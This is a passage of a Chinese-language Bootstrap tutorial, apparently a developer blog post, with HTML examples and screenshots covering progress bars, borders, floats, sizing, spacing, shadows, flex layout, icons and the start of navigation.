    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/580a2da8f99d4320906bf8115164fd39~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=Q2i734IikbvFePfDTl5tBc4g8fo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-89">进度条颜色</h3>
<p>可以使用背景颜色来创建各种颜色的进度条，默认情况下为蓝色进度条。</p>
<h3 data-id="heading-90">条纹进度条</h3>
<p>通过<code>.progress-bar</code>上添加<code>.progress-bar-striped</code>即可，条纹是通过css渐变生成的可以同不同的背景颜色生成不同的条纹进度条。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"progress"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"height: 1.5rem;"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"progress-bar progress-bar-striped"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width:50%"</span>&gt;</span>
        50%
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e92108b85d114052ac02deac35970c98~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=9%2BM4NkePCRecp6Q2bdxYnd06knw%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-91">进度条动画</h3>
<p>将<code>.progress-bar-animated</code>添加到<code>.progress-bar</code>元素上可以为条纹的进度条设置动画。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"progress"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"height: 1.5rem;"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"progress-bar progress-bar-animated progress-bar-striped"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width:50%"</span>&gt;</span>
        50%
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/439739441b38455ab6b313065b6b2052~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=CPIBcsLkckMZ4FtnnKu3aFGWUMU%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-92">混合色彩进度条</h3>
<p>可以在一个进度组件中放多个进度条是它们并排在一起。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"progress"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"height: 1.5rem;"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"progress-bar progress-bar-animated progress-bar-striped"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width:50%"</span>&gt;</span>
        50%
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"progress-bar bg-warning progress-bar-animated progress-bar-striped"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width:20%"</span>&gt;</span>
        20%
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b8f6ca93122487d9f4b37119788dfd2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=dYDjHc6OP1jpO%2BeCkrcFwmPLGHU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-93">Bootstrap 边框</h2>
<h3 data-id="heading-94">边框类</h3>
<p>使用边框类为元素添加或删除内容：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"border bg-light border-primary"</span>&gt;</span>边框<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"border border-3"</span>&gt;</span>3边框<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"border border-top-0"</span>&gt;</span>无顶部边框<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"border border-right-0"</span>&gt;</span>无右侧边框<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"border border-left-0"</span>&gt;</span>无左侧边框<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"border border-bottom-0"</span>&gt;</span>无底部边框<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"border-top"</span>&gt;</span>顶部边框<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"border-end"</span>&gt;</span>右侧边框<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"border-start"</span>&gt;</span>左侧边框<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"border-bottom"</span>&gt;</span>底部边框<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df22bd63f51f411c8103fc94d8205278~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=okuSForWn0ebJr53K16Hi9Eyd3w%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-95">边框圆角</h3>
<p>使用<code>.rounded</code>类为元素添加圆角：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"rounded bg-dark"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width: 100px;margin-top: 10px;"</span>&gt;</span>圆角<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"rounded-top bg-dark"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width: 100px;margin-top: 10px;"</span>&gt;</span>圆角<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"rounded-end bg-dark"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width: 100px;margin-top: 10px;"</span>&gt;</span>圆角<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"rounded-bottom bg-dark"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width: 100px;margin-top: 10px;"</span>&gt;</span>圆角<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"rounded-start bg-dark"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width: 100px;margin-top: 10px;"</span>&gt;</span>圆角<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"rounded-circle bg-dark"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width: 100px;margin-top: 10px;"</span>&gt;</span>圆角<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"rounded-pill bg-dark"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width: 100px;margin-top: 10px;"</span>&gt;</span>圆角<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"rounded-0 bg-dark"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width: 100px;margin-top: 10px;"</span>&gt;</span>圆角<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"rounded-1 bg-dark"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width: 100px;margin-top: 10px;"</span>&gt;</span>圆角<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"rounded-2 bg-dark"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width: 100px;margin-top: 10px;"</span>&gt;</span>圆角<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下:</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0a6c2d100cd4d81b505b521c51a2130~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=njkzkwj%2BIS3Fa7u7rQyALbzcCmA%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-96">Bootstrap 浮动与清除浮动</h2>
<h3 data-id="heading-97">基础用法</h3>
<p>我们可以通过 <code>.float-end</code>和<code>.float-start</code>分别设置元素向右和向左移动，<code>.clearfix</code>用于清除浮动。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"clearfix"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"float-start"</span>&gt;</span>向左<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"float-end"</span>&gt;</span>向右<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51b2336393cd46f1bdd71b11116cf07e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=IHEvL5XiG7I4I2s90aE%2FlTLubBE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-98">响应式浮动</h3>
<p>我们可以根据屏幕尺寸来设置浮动效果<code>.float-*-start | end</code>。</p>
<ul>
<li>sm (&gt;= 576px)</li>
<li>md (&gt;=768px)</li>
<li>lg (&gt;=992px)</li>
<li>xl (&gt;=1200px)</li>
<li>xxl (&gt;=1400px)</li>
</ul>
<h2 data-id="heading-99">Bootstrap 居中对齐</h2>
<p>Bootstrap是使用了<code>.mx-auto</code>来设置元素的居中对齐，原理是将 <code>margin-left</code>和<code>margin-right</code>设置为<code>auto</code>。</p>
<h2 data-id="heading-100">Bootstrap 宽度和高度</h2>
<h3 data-id="heading-101">宽度</h3>
<p>Bootstrap 使用<code>w-*</code>来设置宽度：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"w-25 bg-primary"</span>&gt;</span>宽度25%<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"w-50 bg-primary"</span>&gt;</span>宽度50%<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"w-75 bg-primary"</span>&gt;</span>宽度75%<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"w-100 bg-primary"</span>&gt;</span>宽度100%<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"w-auto bg-primary"</span>&gt;</span>宽度自适应<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mw-100 bg-primary"</span>&gt;</span>最大宽度为100%<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2d946fd92764b8ba2298ba347f5f92f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=iLJOFTqBXRoQq2t5kvWrBOQkvPU%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-102">高度</h3>
<p>Bootstrap 使用<code>h-*</code>来设置高度：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-light"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"height: 300px;"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"h-25 bg-warning"</span>&gt;</span>高度25%<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"h-50 bg-warning"</span>&gt;</span>高度50%<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"h-75 bg-warning"</span>&gt;</span>高度75%<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"h-100 bg-warning"</span>&gt;</span>高度100%<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"h-auto bg-warning"</span>&gt;</span>自适应<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下:</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/075ca7c9468b4fc39ced81eb3876e0ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=5mf7k3TwcfVZpOBxiZFsUUSehtY%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-103">Bootstrap 间距</h2>
<h3 data-id="heading-104">基础使用</h3>
<p>间距是元素与周边元素的距离，Bootstrap 中使用<code>m-*</code>定义外边距，使用<code>p-*</code>定义内边距。间距值为 1-5 如<code>m-2</code>等。</p>
<h3 data-id="heading-105">间距的方向</h3>
<ul>
<li>使用<code>*t-*</code>来设置上外边距或上内边距</li>
<li>使用<code>*b-*</code>来设置下外边距或下内边距</li>
<li>使用<code>*s-*</code>来设置左外边距或左内边距</li>
<li>使用<code>*e-*</code>来设置右外边距或右内边距</li>
<li>使用<code>*x-*</code>来设置left或right</li>
<li>使用<code>*y-*</code>来设置top或bottom</li>
</ul>
<h3 data-id="heading-106">响应式间距</h3>
<p>我们可以通过<code>mx-*-*</code>来设置在某一个断点如何显示间距等。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mx-lg-2"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<h2 data-id="heading-107">Bootstrap 阴影</h2>
<p>我们可以通过 <code>.shadow</code>类来为元素添加阴影:</p>
<ul>
<li><strong>.shadow</strong>：为元素添加阴影</li>
<li><strong>.shadow-sm</strong>：为元素添加一个小阴影</li>
<li><strong>.shadow-lg</strong>：为元素添加一个更大的阴影</li>
<li><strong>.shadow-none</strong>：移除元素上的阴影</li>
</ul>
<h2 data-id="heading-108">Bootstrap Flex弹性布局</h2>
<p>弹性布局是我们经常用到的布局模式，更适合我们开发响应式的设计。</p>
<h3 data-id="heading-109">创建弹性盒子</h3>
<p>使用<code>.d-flex</code>,创建 Flexbox 容器并将之类转换为flex项。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"d-flex"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"p-2 bg-primary"</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"p-2 bg-warning"</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"p-2 bg-secondary"</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0bd6365522014481842bf0fabc4ba308~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=UriHPZd0o2mt%2B0yTr08kX9Ffj9s%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-110">水平方向</h3>
<p><code>.flex-row</code>可以设置弹性盒子元素水平显示，默认为水平方向。也可以使用<code>.flex-row-reverse</code>用于右对齐显示。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"d-flex flex-row-reverse"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"p-2 bg-primary"</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"p-2 bg-warning"</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"p-2 bg-secondary"</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/738ff29a868d4c8887afd9673c9073c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=f7h%2B%2B4v2AfBjUvXmxtudve9cMwQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-111">垂直方向</h3>
<p><code>.flex-column</code>设置元素垂直方向显示，或使用<code>.flex-column-reverse</code>反转垂直方向。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"d-flex flex-column"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"p-2 bg-primary"</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"p-2 bg-warning"</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"p-2 bg-secondary"</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5bc62fbd7af440cebe0aa31b92673510~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=aDPoIoDuRBb6lOQI08DrzyG3VBY%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-112">换行</h3>
<p>默认情况下元素都在一行显示，如果一行排不下我们可以通过以下类进行换行等。</p>
<ul>
<li><strong>.flex-nowrap</strong>：不换行，默认</li>
<li><strong>.flex-wrap</strong>：换行,第一行在上方</li>
<li><strong>.flex-wrap-reverse</strong>：换行,第一行在下方</li>
</ul>
<h3 data-id="heading-113">对其方式</h3>
<h4 data-id="heading-114">水平方向</h4>
<p>使用<code>.justify-content-*</code>类可改变弹性元素水平方向的对其方式。</p>
<ul>
<li><strong>.justify-content-start</strong>：右对齐</li>
<li><strong>.justify-content-end</strong>：左对齐</li>
<li><strong>.justify-content-center</strong>：居中对齐</li>
<li><strong>.justify-content-between</strong>：两端对齐</li>
<li><strong>.justify-content-around</strong>：两端对齐，与父元素留有边距</li>
</ul>
<h4 data-id="heading-115">单行垂直方向</h4>
<p>使用<code>.align-item-*</code>类可改变弹性元素单行垂直方向的对其方式。</p>
<ul>
<li><strong>.align-item-start</strong>：交叉轴上对齐</li>
<li><strong>.align-item-end</strong>：交叉轴下对齐</li>
<li><strong>.align-item-center</strong>：交叉轴居中对齐</li>
<li><strong>.align-item-baseline</strong>：交叉轴梯线对齐</li>
<li><strong>.align-item-stretch</strong>：高度沾满整个容器，默认值</li>
</ul>
<h4 data-id="heading-116">多行垂直方向</h4>
<p>使用<code>.align-content-*</code>类可改变弹性元素多行垂直方向的对其方式。</p>
<ul>
<li><strong>.align-content-start</strong>：交叉轴上对齐</li>
<li><strong>.align-content-end</strong>：交叉轴下对齐</li>
<li><strong>.align-content-center</strong>：交叉轴居中对齐</li>
<li><strong>.align-content-between</strong>：交叉轴两端对齐</li>
<li><strong>.align-content-around</strong>：交叉轴两端对齐，与父元素留有边距</li>
<li><strong>.align-content-stretch</strong>：高度沾满整个容器，默认值</li>
</ul>
<h4 data-id="heading-117">排序</h4>
<p>我们也可以通过<code>order-*</code>来对容器进行排序。</p>
<h4 data-id="heading-118">等宽</h4>
<p>在flex布局中我们可以通过<code>.flex-fill</code>来强制它们等宽。</p>
<h4 data-id="heading-119">伸展</h4>
<p>在flex布局中我们可以通过<code>.flex-grow-1</code>可占用多余空间。</p>
<h4 data-id="heading-120">指定子元素对齐</h4>
<p>我们可以对子元素设置<code>.algin-self-*</code>来控制子元素的对其方式。</p>
<ul>
<li><strong>.align-self-start</strong>：交叉轴上对齐</li>
<li><strong>.align-self-end</strong>：交叉轴下对齐</li>
<li><strong>.align-self-center</strong>：交叉轴居中对齐</li>
<li><strong>.align-self-baseline</strong>：交叉轴梯线对齐</li>
<li>.align-self-stretch：高度沾满整个容器，默认值</li>
</ul>
<h4 data-id="heading-121">响应式flex类</h4>
<p>我们也可以根据不同的设备来设置<code>.d-*-flex</code>响应式布局。也可以使用<code>.justify-content-*-*</code>来设置对其方式等。</p>
<h2 data-id="heading-122">Bootstrap 字体图标</h2>
<p>我们可以使用Bootstrap提供的字体图标来丰富我们的页面效果实现步骤如下：</p>
<h3 data-id="heading-123">在HTML文档引入Bootstrap CDN链接</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css"</span>&gt;</span>
</code></pre>
<h3 data-id="heading-124">使用Bootstrap图标</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bi bi-airplane-engines-fill"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e4f1c86a6a84619b4da7839b784a363~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=gQYTKpXeu6hxiEgCFKlG7TWZGu4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-125">Bootstrap 导航</h2>
<p>Bootstrap 中提供了一种简单快捷的方法来创建基本导航，它提供了非常灵活和优雅的选修课和Pills等组件。</p>
<h3 data-id="heading-126">基本导航</h3>
<p>创建简单的水平菜单，我们可以将<code>.nav</code>添加到<code>ul</code>元素中然后再为每个<code>li</code>添加<code>.nav-item</code>并将<code>.nav-link</code>添加到链接元素中。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>HTML<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
